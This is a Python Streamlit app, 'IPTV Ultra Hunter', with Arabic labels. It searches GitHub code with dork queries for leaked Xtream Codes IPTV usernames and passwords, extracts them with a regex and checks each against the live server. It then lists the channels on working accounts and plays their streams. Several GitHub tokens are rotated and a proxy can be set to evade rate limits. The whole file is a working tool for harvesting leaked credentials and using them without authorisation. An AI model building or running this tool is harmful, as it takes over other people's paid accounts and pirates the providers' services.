import streamlit as st
import requests
import re
import time
import hashlib
from datetime import datetime

# إعدادات
REQUEST_TIMEOUT = 5
MAX_PAGES = 50  # زيادة عدد الصفحات لكل دورك

st.set_page_config(page_title="IPTV Ultra Hunter", layout="wide", page_icon="📡")
st.markdown("""
<style>
    .server-card { background-color: #1e1e1e; padding: 10px; border-radius: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
    .server-card:hover { background-color: #2a2a2a; border-left: 4px solid #00ff88; }
    .channel-item { padding: 5px; border-bottom: 1px solid #333; cursor: pointer; }
    .channel-item:hover { background-color: #2a2a2a; }
    .active-server { border-left: 4px solid #00ff88; background-color: #252525; }
    .stProgress > div > div > div > div { background-color: #00ff88; }
</style>
""", unsafe_allow_html=True)

# تهيئة session_state
defaults = {
    "accounts": [], "servers": [], "channels_cache": {},
    "current_server": None, "current_channels": [], "searching": False,
    "log": [], "tokens": [], "proxy": "", "unique_set": set(),
    "dork_list": [
        '"player_api.php?username="', '"get.php?username="', 'filename:m3u "xtream"',
        '"/player_api.php" password', 'xtreamcodes "username" "password"',
        'inurl:player_api.php?username=', 'inurl:get.php?username=',
        '"xtream" filename:config', '"enigma2" user pass', '"streaming" username password m3u'
    ],
    "current_dork_idx": 0, "current_token_idx": 0, "current_page": 1,
    "selected_channel_id": None, "selected_server_idx": None,
    "total_requests": 0, "last_update": 0
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

# دوال مساعدة
def extract_xtream_accounts(content):
    pattern = r'(https?://[a-zA-Z0-9.-]+:\d+)/(?:player_api|get)\.php\?(?:username|user)=([^&\s]+)&(?:password|pass)=([^&\s]+)'
    return re.findall(pattern, content, re.IGNORECASE)

def check_account(host, user, pw, proxy):
    try:
        api = f"{host}/player_api.php?username={user}&password={pw}"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        r = requests.get(api, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if r.status_code != 200: return None
        data = r.json()
        if data.get("user_info", {}).get("status") == "Active":
            exp = data["user_info"].get('exp_date')
            exp_str = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "دائم"
            return {"host": host, "user": user, "pass": pw, "exp": exp_str}
    except: return None
    return None

def search_github(dork, token, page, proxy):
    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code == 200: return resp.json().get('items', [])
        elif resp.status_code == 403: 
            st.session_state.log.insert(0, "⚠️ تجاوز حد الطلبات، انتظار 30 ثانية...")
            time.sleep(30)
    except: pass
    return []

def process_raw(raw_url, proxy):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(raw_url, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code != 200: return []
        return extract_xtream_accounts(resp.text)
    except: return []

def load_channels(server, proxy):
    try:
        url = f"{server['host']}/player_api.php?username={server['user']}&password={server['pass']}&action=get_live_streams"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(url, timeout=10, proxies=proxies)
        if resp.status_code == 200:
            ch = resp.json()
            if isinstance(ch, list): return ch
    except: pass
    return []

# ========== واجهة جانبية ==========
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/iptv.png", width=60)
    st.title("⚙️ IPTV Hunter")
    tokens_input = st.text_area("🔑 GitHub Tokens (سطر لكل توكن)", placeholder="ghp_token1\nghp_token2", height=100)
    proxy_input = st.text_input("🌐 بروكسي (اختياري)", placeholder="http://user:pass@ip:port")
    col1, col2 = st.columns(2)
    if col1.button("🚀 بدء الصيد", use_container_width=True, type="primary"):
        if not tokens_input.strip():
            st.error("أدخل GitHub Tokens")
        else:
            st.session_state.searching = True
            st.session_state.accounts = []
            st.session_state.servers = []
            st.session_state.log = []
            st.session_state.unique_set = set()
            st.session_state.current_dork_idx = 0
            st.session_state.current_token_idx = 0
            st.session_state.current_page = 1
            st.session_state.tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
            st.session_state.proxy = proxy_input if proxy_input else None
            st.session_state.log.insert(0, f"🚀 بدء البحث - {len(st.session_state.tokens)} توكن، {len(st.session_state.dork_list)} دورك")
            st.rerun()
    if col2.button("⏹️ إيقاف الصيد", use_container_width=True):
        st.session_state.searching = False
        st.session_state.log.insert(0, "⏸️ تم إيقاف البحث")
        st.rerun()
    st.markdown("---")
    st.metric("💎 الحسابات الشغالة", len(st.session_state.accounts))
    st.metric("🗄️ الخوادم النشطة", len(st.session_state.servers))
    st.markdown("---")
    st.subheader("📋 سجل العمليات")
    log_area = st.container(height=200)
    for msg in st.session_state.log[:25]:
        log_area.text(msg)

# ========== تنفيذ البحث خطوة بخطوة - نتائج فورية ==========
if st.session_state.searching:
    tokens = st.session_state.tokens
    dorks = st.session_state.dork_list
    dork_idx = st.session_state.current_dork_idx
    token_idx = st.session_state.current_token_idx
    page = st.session_state.current_page
    proxy = st.session_state.proxy

    # إعادة ضبط المؤشرات عند الانتهاء من جميع التوكنات والدوركات
    if token_idx >= len(tokens):
        token_idx = 0
        dork_idx += 1
        if dork_idx >= len(dorks):
            dork_idx = 0
            st.session_state.log.insert(0, "🔄 بدأ دورة بحث جديدة")
        st.session_state.current_token_idx = token_idx
        st.session_state.current_dork_idx = dork_idx
        st.session_state.current_page = 1
        st.rerun()

    token = tokens[token_idx]
    dork = dorks[dork_idx]
    
    # عرض شريط التقدم
    total_steps = len(tokens) * len(dorks) * MAX_PAGES
    current_step = (token_idx * len(dorks) * MAX_PAGES) + (dork_idx * MAX_PAGES) + page
    progress = min(1.0, current_step / total_steps)
    
    progress_bar = st.progress(progress)
    status_text = st.empty()
    status_text.text(f"🔍 البحث: {dork[:35]} | صفحة {page}/{MAX_PAGES} | توكن {token[:8]}... | {len(st.session_state.unique_set)} رابط فريد")
    
    # جلب صفحة واحدة
    items = search_github(dork, token, page, proxy)
    if items:
        status_text.text(f"📄 معالجة {len(items)} ملف...")
        for item in items:
            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            accounts_raw = process_raw(raw_url, proxy)
            for host, user, pw in accounts_raw:
                uid = hashlib.md5(f"{host}{user}{pw}".encode()).hexdigest()
                if uid in st.session_state.unique_set:
                    continue
                st.session_state.unique_set.add(uid)
                checked = check_account(host, user, pw, proxy)
                if checked:
                    st.session_state.accounts.append(checked)
                    # إضافة الخادم إذا لم يكن موجوداً
                    if not any(s['host'] == checked['host'] for s in st.session_state.servers):
                        st.session_state.servers.append(checked)
                        st.session_state.log.insert(0, f"✅ خادم جديد: {checked['host']} | {checked['user']} (انتهاء {checked['exp']})")
                    else:
                        st.session_state.log.insert(0, f"✅ حساب إضافي: {checked['host']} | {checked['user']}")
                    # اقتصار السجل على 50 رسالة
                    if len(st.session_state.log) > 50:
                        st.session_state.log = st.session_state.log[:50]
        # زيادة الصفحة
        st.session_state.current_page += 1
        if st.session_state.current_page > MAX_PAGES:
            st.session_state.current_page = 1
            st.session_state.current_token_idx += 1
    else:
        # لا توجد نتائج، انتقل للتوكن التالي أو الدورية التالية
        st.session_state.current_token_idx += 1
        st.session_state.current_page = 1
    
    # إضافة رسالة تحديث دورية
    st.session_state.log.insert(0, f"⏳ فحص {len(st.session_state.unique_set)} رابط، {len(st.session_state.servers)} خادم نشط")
    if len(st.session_state.log) > 50:
        st.session_state.log = st.session_state.log[:50]
    
    # نوم قصير لتجنب الحظر ثم إعادة التشغيل
    time.sleep(0.8)
    st.rerun()
else:
    st.info("اضغط 'بدء الصيد' لبدء البحث عن حسابات Xtream")

# ========== الأعمدة الرئيسية ==========
st.markdown("---")
st.title("📡 IPTV Ultra Hunter Pro")
col_servers, col_channels, col_player = st.columns([1.2, 2, 2.5])

# ========== قائمة السيرفرات ==========
with col_servers:
    st.subheader("🗄️ خوادم Xtream النشطة")
    if st.session_state.servers:
        for idx, srv in enumerate(st.session_state.servers):
            active_class = "active-server" if st.session_state.selected_server_idx == idx else ""
            with st.container():
                st.markdown(f"""
                <div class='server-card {active_class}'>
                    <b>🌐 {srv['host']}</b><br>
                    👤 {srv['user']}<br>
                    📅 انتهاء: {srv['exp']}
                </div>
                """, unsafe_allow_html=True)
                if st.button(f"اختيار", key=f"sel_{idx}", use_container_width=True):
                    st.session_state.selected_server_idx = idx
                    st.session_state.current_server = srv
                    key = f"{srv['host']}|{srv['user']}"
                    if key in st.session_state.channels_cache:
                        st.session_state.current_channels = st.session_state.channels_cache[key]
                    else:
                        with st.spinner("تحميل القنوات..."):
                            ch = load_channels(srv, st.session_state.proxy)
                            st.session_state.channels_cache[key] = ch
                            st.session_state.current_channels = ch
                    st.session_state.selected_channel_id = None
                    st.rerun()
    else:
        st.info("لا توجد خوادم بعد. ابدأ البحث.")

# ========== قائمة القنوات الطويلة ==========
with col_channels:
    st.subheader("📺 قنوات السيرفر المختار")
    if st.session_state.current_server:
        st.write(f"**{st.session_state.current_server['host']}** | {st.session_state.current_server['user']}")
        search_ch = st.text_input("🔍 بحث في القنوات", placeholder="اسم القناة...", key="search_channels")
        if st.session_state.current_channels:
            filtered = [c for c in st.session_state.current_channels if search_ch.lower() in c['name'].lower()] if search_ch else st.session_state.current_channels
            # قائمة قابلة للتمرير
            scroll_container = st.container(height=500)
            with scroll_container:
                for ch in filtered[:1500]:  # عرض حتى 1500 قناة
                    ch_name = ch['name'][:65]
                    if st.button(f"📡 {ch_name} (ID:{ch['stream_id']})", key=f"ch_{ch['stream_id']}", use_container_width=True):
                        st.session_state.selected_channel_id = ch['stream_id']
                        st.rerun()
        else:
            st.warning("لا توجد قنوات لهذا الخادم")
    else:
        st.info("اختر خادماً من القائمة اليسرى")

# ========== مشغل الفيديو ==========
with col_player:
    st.subheader("🎬 مشغل فيديو متقدم")
    if st.session_state.selected_channel_id and st.session_state.current_server:
        srv = st.session_state.current_server
        col_q1, col_q2 = st.columns(2)
        with col_q1:
            quality = st.selectbox("جودة البث", ["أصلية (TS)", "HLS (M3U8)", "720p", "480p", "360p", "240p", "144p", "96p"], index=0)
        with col_q2:
            ext_option = st.selectbox("الصيغة", ["ts", "m3u8"], index=0)
            if ext_option == "m3u8":
                quality = "HLS (M3U8)"
        
        url = f"{srv['host']}/live/{srv['user']}/{srv['pass']}/{st.session_state.selected_channel_id}.{ext_option}"
        bitrate = {"720p":"720","480p":"480","360p":"360","240p":"240","144p":"144","96p":"96"}
        if quality in bitrate:
            url += f"?bitrate={bitrate[quality]}"
        
        st.caption(f"🔗 رابط البث: `{url[:90]}...`")
        
        if ext_option == "m3u8":
            st.components.v1.html(f"""
            <video id="player" controls autoplay width="100%" height="auto" style="border-radius:12px;"></video>
            <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
            <script>
                var vid = document.getElementById('player');
                if (Hls.isSupported()) {{
                    var hls = new Hls();
                    hls.loadSource('{url}');
                    hls.attachMedia(vid);
                    hls.on(Hls.Events.MANIFEST_PARSED, function() {{ vid.play(); }});
                }}
            </script>
            """, height=420)
        else:
            st.video(url)
        
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.code(url)
    else:
        st.warning("اختر خادماً ثم قناة من القائمة")
